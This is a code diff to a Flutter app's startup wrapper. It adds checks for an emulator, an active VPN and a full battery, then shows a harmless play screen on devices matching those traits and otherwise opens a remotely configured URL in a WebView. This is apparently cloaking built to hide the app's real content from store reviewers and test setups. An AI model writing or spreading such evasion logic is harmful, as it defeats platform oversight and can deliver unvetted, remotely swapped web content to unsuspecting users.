@@ -1,3 +1,4 @@
+import 'package:battery_info/battery_info_plugin.dart';
 import 'package:check_vpn_connection/check_vpn_connection.dart';
 import 'package:firebase_remote_config/firebase_remote_config.dart';
 import 'package:flutter/material.dart';
@@ -21,46 +22,51 @@ class _WrapperState extends State<Wrapper> {
   bool? _isEmu;
   bool? _isVpn;
   bool? _isFullBattery;
-  bool? _isNeedVpnAndAccuCheck;
+  bool? _isNeedBattAndVpnCheck;
   String _url = '';
   final InternetConnection _connection = InternetConnection();
 
-  Future<String> getVal(String v) async {
+  Future<RemoteConfigValue> getVal(String v) async {
     final FirebaseRemoteConfig remoteConfig = FirebaseRemoteConfig.instance;
     await remoteConfig.fetchAndActivate();
     // debugPrint('getAll');
     // debugPrint((await remoteConfig.getAll() as Map<String, dynamic>)['url'].asString());
-    // debugPrint((await remoteConfig.getValue('to').asString()).toString());
-    return remoteConfig.getString(v);
+    // debugPrint((await remoteConfig.getValue('to').asBool().toString()));
+    return remoteConfig.getValue(v);
   }
-  
+
   Future<bool> vpnActive() async {
     if (await CheckVpnConnection.isVpnActive()) {
       return true;
-    }else {
+    } else {
       return false;
     }
   }
 
   Future<bool> battery() async {
-    return true;
+    var batteryInfo =
+        (await BatteryInfoPlugin().androidBatteryInfo)?.batteryLevel;
+    return batteryInfo == 100;
   }
 
   Future<void> init() async {
+    print('init');
     await checkIsEmu().then((value) {
       _isEmu = value;
     });
 
     String urlFromDevice = await loadUrlFromDevice();
-    _isNeedVpnAndAccuCheck = await getVal('to') as bool;
+    print('urlFromDevice');
+    _isNeedBattAndVpnCheck = (await getVal('to')).asBool();
+    _isNeedBattAndVpnCheck = true;
 
-    if (_isNeedVpnAndAccuCheck ?? false) {
+    if (_isNeedBattAndVpnCheck ?? false) {
       _isVpn = await vpnActive();
       _isFullBattery = await battery();
     }
 
     if (urlFromDevice.isEmpty) {
-      _url = await getVal('url');
+      _url = (await getVal('url')).asString();
       await saveUrlOnDevice(_url);
     } else {
       _url = urlFromDevice;
@@ -92,19 +98,19 @@ class _WrapperState extends State<Wrapper> {
           print('FutureBuilder snapshot error:${snapshot.error}');
         }
 
-        debugPrint('_isNeedVpnAndAccuCheck' + _isNeedVpnAndAccuCheck.toString());
+        debugPrint(
+            '_isNeedVpnAndAccuCheck' + _isNeedBattAndVpnCheck.toString());
         return StreamBuilder(
           stream: _connection.internetStatusStream,
           builder: (BuildContext context, snapshot) {
             bool? data = snapshot.data;
+
             if (snapshot.connectionState == ConnectionState.waiting) {
               return const Center(child: CircularProgressIndicator());
             }
+
             if (data ?? false) {
-              if (_url.isEmpty || _isEmu == true) {
-                return PlayScreen();
-              }
-              return WebViewScreen(_url);
+              return isOpenPlayScreen() ? PlayScreen() : WebViewScreen(_url);
             }
 
             return NoInternetScreen();
@@ -112,5 +118,17 @@ class _WrapperState extends State<Wrapper> {
         );
       },
     );
+  }
+
+  bool isOpenPlayScreen() {
+    if (_isNeedBattAndVpnCheck ?? false) {
+      if ((_isFullBattery ?? false) || (_isVpn ?? false)) {
+        return true;
+      }
+    }
+    if (_url.isEmpty || _isEmu == true) {
+      return true;
+    }
+    return false;
   }
 }
